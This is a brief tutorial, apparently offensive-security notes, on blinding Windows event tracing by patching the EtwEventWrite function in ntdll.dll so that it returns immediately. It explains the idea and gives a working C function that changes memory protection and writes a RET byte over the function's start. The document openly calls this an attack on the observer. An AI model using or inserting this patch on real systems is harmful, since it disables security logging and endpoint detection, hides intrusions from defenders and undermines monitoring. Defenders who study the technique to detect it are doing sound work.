The goal is to **break the log transmission chain to ETW** by **patching the functions responsible for sending events**.

This is an **attack on the observer itself**.

**Main target: `EtwEventWrite`**

## What is it?

`EtwEventWrite` is a function located in `ntdll.dll` that is used to **emit events to ETW**.

When a NT call generates an event (e.g., `NtCreateThreadEx`, `VirtualProtect`, etc.), it’s **not the NT call itself** that sends the event — it’s an **internal call to `EtwEventWrite`** that does.

## **Classic patch = RET**

We replace the beginning of `EtwEventWrite` with a **`RET` instruction**, causing any attempt to call it to **return immediately and do nothing**.

## SIMPLE EXAMPLE:

```C
void PatchETW() {
    void* etw = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD oldProtect;
    BYTE patch[] = { 0xC3 }; // RET instruction

    VirtualProtect(etw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(etw, patch, sizeof(patch));
    VirtualProtect(etw, sizeof(patch), oldProtect, &oldProtect);
}
```
